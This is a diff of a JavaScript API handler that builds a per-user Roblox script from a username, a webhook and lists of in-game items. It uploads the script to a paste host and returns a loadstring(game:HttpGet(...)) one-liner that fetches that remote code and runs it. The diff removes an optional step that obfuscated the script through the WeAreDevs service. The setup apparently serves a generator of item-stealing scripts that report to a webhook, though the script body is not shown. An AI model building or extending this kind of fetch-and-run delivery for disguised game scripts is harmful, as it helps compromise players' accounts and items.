@@ -4,50 +4,30 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled, userId } = req.body;
+    const { username, webhook, mode, brainrots, skins, gears, customCode, userId } = req.body;
 
     if (!username) {
         return res.status(400).json({ error: 'Username is required' });
     }
 
     try {
-        // 1. Construir el script completo
+        // 1. Construir el script completo (SIN ofuscar)
         const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);
 
-        let finalScript = script;
-        let obfuscated = false;
-        let obfuscationError = null;
-
-        // 2. Si se pide ofuscar, intentarlo
-        if (shortEnabled) {
-            try {
-                console.log('Intentando ofuscar con WeAreDevs...');
-                finalScript = await obfuscateWithWeAreDevs(script);
-                obfuscated = true;
-                console.log('Ofuscación exitosa.');
-            } catch (error) {
-                console.error('Error al ofuscar:', error.message);
-                obfuscationError = error.message;
-                // No fallamos, seguimos con el script sin ofuscar
-                finalScript = script;
-                obfuscated = false;
-            }
-        }
-
-        // 3. SUBIR A TU PASTEFY INTERNO (SIEMPRE)
+        // 2. SUBIR A TU PASTEFY INTERNO (SIEMPRE)
         const pasteUrl = await saveToInternalPaste(
-            finalScript,
-            `Script ${obfuscated ? 'ofuscado' : ''} para ${username}`,
+            script,
+            `Script para ${username}`,
             userId
         );
 
-        // 4. Devolver el loadstring con tu URL
+        // 3. Devolver el loadstring con tu URL
         return res.status(200).json({
             loadstring: `loadstring(game:HttpGet("${pasteUrl}"))()`,
-            script: finalScript,
+            script: script,
             pasteUrl: pasteUrl,
-            obfuscated: obfuscated,
-            warning: obfuscationError || null
+            obfuscated: false,
+            warning: null
         });
 
     } catch (error) {
@@ -101,34 +81,6 @@ end)`;
     }
 
     return fullScript;
-}
-
-// ============================================================
-//  OFUSCAR CON WEAREDEVS
-// ============================================================
-async function obfuscateWithWeAreDevs(script) {
-    const response = await fetch('https://wearedevs.net/api/obfuscate', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ script: script })
-    });
-
-    if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
-    }
-
-    const data = await response.json();
-
-    if (!data.success) {
-        throw new Error(data.error || 'WeAreDevs devolvió success: false');
-    }
-
-    const obfuscated = data.obfuscated;
-    if (!obfuscated) {
-        throw new Error('No se pudo obtener el script ofuscado.');
-    }
-    return obfuscated;
 }
 
 // ============================================================
